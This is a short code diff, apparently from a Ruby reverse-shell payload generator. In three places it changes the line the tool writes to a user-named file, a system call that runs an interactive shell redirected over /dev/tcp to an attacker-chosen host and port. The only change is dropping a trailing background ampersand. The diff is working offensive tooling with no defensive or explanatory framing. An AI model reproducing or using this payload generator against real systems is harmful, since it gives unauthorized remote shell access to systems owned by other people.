@@ -63,7 +63,7 @@ if File.directory? file
             puts "#{g}Saving to #{file}..."
             sleep(0.5)
             open(file, 'w') { |f|
-                f.puts "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+                f.puts "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
             }
             puts "#{s}Saved to #{file}!"
         else
@@ -74,7 +74,7 @@ if File.directory? file
             puts "#{g}Saving to #{file}..."
             sleep(0.5)
             open(file, 'w') { |f|
-                f.puts "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+                f.puts "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
             }
             puts "#{s}Saved to #{file}!"
         end
@@ -99,7 +99,7 @@ else
             puts "#{g}Saving to #{file}..."
             sleep(0.5)
             open(file, 'w') { |f|
-                f.puts "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+                f.puts "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
             }
             puts "#{s}Saved to #{file}!"
         else
